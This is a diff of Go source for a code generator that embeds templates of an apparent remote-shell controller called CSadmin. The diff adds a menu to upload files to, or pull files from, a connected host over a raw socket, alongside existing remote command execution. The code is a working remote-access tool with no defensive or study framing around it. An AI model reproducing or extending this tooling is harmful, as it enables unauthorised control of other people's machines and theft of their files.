@@ -2,6 +2,8 @@ package code
 
 var MainS string = `
 
+
+
 package main
 
 import "CSadmin/action"
@@ -10,6 +12,8 @@ func main() {
 	action.Conn_ip()
 
 }
+
+
 
 `
 
@@ -21,8 +25,8 @@ import (
 	"CSadmin/upload"
 	"fmt"
 	"net"
-	"time"
 	"strings"
+	"time"
 )
 
 var port string
@@ -65,24 +69,49 @@ connall:
 			code_check_shell := "XioaruanUpload"
 			function.Write_conn(conn, code_check_shell)
 			for {
-				files := "File"
-				fmt.Printf("%v >", files)
-				function.Scanf(&file)
-				if file == "exit()" {
-					check = "no"
-					function.Write_conn(conn, check)
-					goto connall
+
+				choose := FileChoose()
+				function.Write_conn(conn, choose)
+
+				switch choose {
+
+				case "1":
+					files := "File"
+					fmt.Printf("%v >", files)
+					function.Scanf(&file)
+					if file == "exit()" {
+						check = "no"
+						function.Write_conn(conn, check)
+						goto connall
+					}
+					code := upload.CheckFile(file)
+					if code == "no" {
+						fmt.Println("文件不存在")
+						continue
+					}
+					filebase := upload.CheckFileName(file)
+					fmt.Println(filebase)
+					function.Write_conn(conn, filebase)
+					time.Sleep(time.Microsecond * 200)
+					upload.Doupload(file, conn)
+				case "2":
+					pwd := function.Read_conn(conn)
+					fmt.Println(pwd)
+					files := "File"
+					fmt.Printf("%v >", files)
+					function.Scanf(&file)
+					if file == "exit()" {
+						check = "no"
+						function.Write_conn(conn, check)
+						goto connall
+					}
+					time.Sleep(time.Microsecond * 200)
+					function.Write_conn(conn, file)
+					upload.CreateFile(conn, file)
+				default:
+					fmt.Println("还没做出来")
+					break
 				}
-				code := upload.CheckFile(file)
-				if code == "no" {
-					fmt.Println("文件不存在")
-					continue
-				}
-				filebase := upload.CheckFileName(file)
-				fmt.Println(filebase)
-				function.Write_conn(conn, filebase)
-				time.Sleep(time.Microsecond * 200)
-				upload.Doupload(file, conn)
 			}
 		default:
 			fmt.Println("还没有开发哦~")
@@ -104,6 +133,7 @@ func chechkongeg(shell string, conn net.Conn, pwd string) {
 	}
 }
 
+
 `
 
 var SwtichS string = `
@@ -123,9 +153,21 @@ func SwitchChoose() string {
 	return choose
 }
 
+func FileChoose() string {
+
+	fmt.Println("【1】 上传文件 【2】 下载文件 ")
+	fmt.Print("choose >")
+	var choose string
+
+	function.Scanf(&choose)
+	return choose
+}
+
+
 `
 
 var Connfunc string = `
+
 package function
 
 import (
@@ -172,9 +214,13 @@ func Write_conn(conn net.Conn, str string) {
 	_, _ = conn.Write([]byte(str))
 }
 
+
+
 `
 
 var ExecS string = `
+
+
 
 package function
 
@@ -240,9 +286,12 @@ func Cd_deal(cmd string) string {
 	return workingDir
 }
 
+
 `
 
 var Use string = `
+
+
 
 package function
 
@@ -265,6 +314,8 @@ func RandNum() int {
 	r := rand.Intn(65535)
 	return r
 }
+
+
 
 `
 var Gosum string = `
@@ -342,3 +393,54 @@ func INt_to_byte(int int64) []byte {
 	return buf
 }
  `
+
+var Admin_download string = `
+package upload
+
+import (
+	"bufio"
+	"encoding/binary"
+	"fmt"
+	"net"
+	"os"
+)
+
+func CreateFile(conn net.Conn, file string) {
+	disfile, _ := os.OpenFile(file, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0666)
+	witer := bufio.NewWriter(disfile)
+	total := 0
+	// fmt.Println(witer, total)
+	//接受文件大小
+	namebuf := make([]byte, 10)
+	n_name, e := conn.Read(namebuf)
+	SHandleError(e, "read")
+	size := byte_to_int64(namebuf[:n_name])
+	fmt.Println(size)
+	filebuf := make([]byte, 1000)
+	for {
+		n, e := conn.Read(filebuf)
+		SHandleError(e, "readfile")
+		total += n
+		witer.Write(filebuf[:n])
+		witer.Flush()
+		fmt.Printf("正在写入%v,共计%v\n", n, total)
+		if total == int(size) {
+			fmt.Println("文件下载完毕")
+			disfile.Close()
+			break
+		}
+	}
+
+}
+
+func byte_to_int64(byte []byte) int64 {
+	return int64(binary.BigEndian.Uint64(byte))
+}
+func SHandleError(err error, when string) {
+	if err != nil {
+		fmt.Println("服务端异常退出，err=", err, when)
+		return
+	}
+}
+
+`
